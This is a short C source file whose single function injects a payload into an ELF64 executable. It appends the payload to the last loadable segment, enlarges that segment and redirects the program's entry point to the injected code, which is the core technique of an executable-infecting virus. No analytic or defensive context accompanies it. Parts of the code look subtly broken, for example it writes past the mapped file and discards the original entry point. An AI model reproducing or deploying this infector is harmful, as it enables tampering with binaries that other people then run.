#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>
#include <elf.h>

void embed_payload(void *map, unsigned char *payload, size_t payload_size) 
{
    if (!map) 
        return;

    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
    Elf64_Phdr *phdr = (Elf64_Phdr *)((char *)map + ehdr->e_phoff);
    Elf64_Phdr *last_load = NULL;

    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_LOAD) {
            last_load = &phdr[i];
        }
    }

    if (!last_load) 
        return;

    size_t new_offset = last_load->p_offset + last_load->p_filesz;
    size_t new_vaddr = last_load->p_vaddr + last_load->p_memsz;
    memcpy((char *)map + new_offset, payload, payload_size);
    last_load->p_filesz += payload_size;
    last_load->p_memsz += payload_size;
    ehdr->e_entry = new_vaddr;
}